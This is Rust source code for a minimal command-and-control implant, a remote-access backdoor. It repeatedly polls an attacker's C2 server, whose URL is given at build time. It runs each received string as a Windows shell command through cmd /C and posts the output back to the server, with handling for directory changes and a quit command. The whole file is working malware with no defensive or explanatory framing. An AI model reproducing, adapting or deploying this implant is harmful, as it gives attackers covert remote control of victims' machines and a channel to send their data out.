use reqwest::Result;
use reqwest::blocking::Client;
use std::process::Command;
use std::time::Duration;
use std::{thread, time};
use std::path::Path;
use std::env;

fn poll_command(client: &Client, url: &str) -> Result<String> {
    // Poll the C2 server to see if we have any waiting commands
    
    let res = client.get(url).send()?.text()?;
    Ok(res)
}

fn run_command(cmd: String, cwd: String) -> String {
    match Command::new("cmd")
            .current_dir(&cwd)
            .args(&["/C", &cmd])
            .output() {
        Ok(output) => {
            let stdout = String::from_utf8(output.stdout).unwrap();
            return stdout
        }
        Err(e) => {
            return format!("Error: {}", e)
        }
    }
}

fn post_result(client: &Client, url: &str, output: String) -> Result<()> {
    client.post(url).body(output).send()?;
    Ok(())
}

fn main() -> Result<()>{

    let url = env!("C2_URL", "Set the C2_URL environment variable with the address of your C2 server");
    let timeout = Duration::new(5,0);
    let client = Client::builder().timeout(timeout).build()?;
    let mut cwd: String = "".to_string();
    match env::current_dir() {
        Ok(dir) => dir.to_str(),
        Err(_) => panic!()
    };

    loop {
        // Check for commands
        match poll_command(&client, url) {
            Ok(cmd) if cmd != "quit" && cmd != "" => {
                if cmd.split(" ").collect::<Vec<&str>>()[0] == "cd" {
                    let pth = cmd.split(" ").collect::<Vec<&str>>()[1];
                    if Path::new(pth).exists() {
                        cwd = pth.to_string().clone();
                    } else {
                        post_result(&client, url, format!("Path {} does not exist or is inaccessible.", pth))?;
                    }
                } else {
                    let output = run_command(cmd.clone(), cwd.clone());
                    post_result(&client, url, output)?; 
                }
            },
            Ok(cmd) if cmd == "quit" => {
                post_result(&client, url, "quitting".to_string())?;
                break
            },
            Err(_) => {
                println!("There has been an error");
                thread::sleep(time::Duration::from_secs(2));
                continue
            },
            Ok(_) => {
                thread::sleep(time::Duration::from_secs(2));
                continue
            }
        }
        
    }

    Ok(())
}
